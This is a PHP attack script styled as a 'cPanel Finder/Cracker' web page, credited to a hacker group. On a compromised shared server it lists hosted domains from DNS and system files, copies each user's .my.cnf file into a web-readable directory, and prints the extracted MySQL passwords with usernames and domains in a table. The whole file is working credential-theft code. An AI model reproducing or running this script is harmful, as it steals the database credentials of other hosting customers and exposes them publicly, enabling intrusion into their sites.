

<style>

body{
	background-image: url(1.jpg);
	color: #FF9933;
	text-align: center;
	font-family: Century Gothic;
	font-size: 14pt;
	background-color: black;
	background-repeat:no-repeat;
	font-weight: bold;
	padding: 0px;
}
a {
color:#fff;
}
a:hover {
color:green;
}
td, th, p, li,table{
	background: #2e2b28;
	border:1px solid #524f46;
	text-align: center;
	-moz-border-radius: 5px;
-webkit-border-radius: 5px;
border-radius: 5px;
}
.result {
padding: 15px;
border: 1px solid #CCC;
width: 500px;
margin: 0 auto;
border-radius: 10px;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
}
input{
	border: 1px solid;
	overflow: hidden;
	background: #2e2b28;
	color: #FF9933;
	-moz-border-radius: 5px;
-webkit-border-radius: 5px;
border-radius: 5px;
}
textarea{
	border: 1px solid;
	overflow: hidden;
	background: #2e2b28;
	color: #FF9933;
	-moz-border-radius: 5px;
-webkit-border-radius: 5px;
border-radius: 5px;
}
.main {
font-family: Bookman Old Style, Century Gothic;
font-size: 40pt;
text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0);
color: rgb(255, 255, 255);
}
.button {
	-webkit-box-shadow:rgba(0,0,0,0.2) 0 1px 0 0;
	-moz-box-shadow:rgba(0,0,0,0.2) 0 1px 0 0;
	box-shadow:rgba(0,0,0,0.2) 0 1px 0 0;
	color:#333;
	background-color:#FA2;
	border-radius:5px;
	-moz-border-radius:5px;
	-webkit-border-radius:5px;
	border:none;
	font-family:Arial,sans-serif;
	font-size:16px;
	font-weight:700;
	height:32px;
	padding:4px 16px;
	text-shadow:#FE6 0 1px 0
}

</style>


cPanel Cracker | Challanger_swat

---Pak Cyber Skullz----

<?php
/**
 * @author: Challanger_swat
 * @mail: swathackers@yahoo.com
 * @Last Updated: 25 Oct 2015
*/

@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}

echo '<html><head>
<title>Automatic cPanel Finder/Cracker | Pak Cyber Skullz</title>
<meta content="text/html; charset=utf-8">
<meta name="keywords" content="cPanel Cracker, Pak Cyber Skullz X" />
<meta name="description" content="Automatic cPanel Finder/Cracker" />
<meta name="author" content="rEd X" />
<link href="azhalogo.ico" type="image/x-icon" rel="shortcut icon">
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<link rel="stylesheet" type="text/css" href="1.css">
</head><body>';
echo '<div style="font-family: Iceland;font-size: 35pt;text-shadow: 0 0 6px #FF0000, 0 0 5px #FF0000, 0 0 5px #FF0000;color: #FFF">cPanel Finder/Cracker<br /><sub>Pak Cyber Skullz</sub></div><br/>';

echo "<center>";
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");

if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();

if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a href='http://".$domain.":2082' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
}

}
}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
				}
            }
			}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';

}
}else{
echo "<div class='result'><i><font color='#FF0000'>ERROR</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf</font> Not Accessible!</i></div>";
}

echo "<br>&#169; <font color='#FF0000'>Challanger_swat</font> | Pak Cyber Skullz";
echo "</body></html>";
?>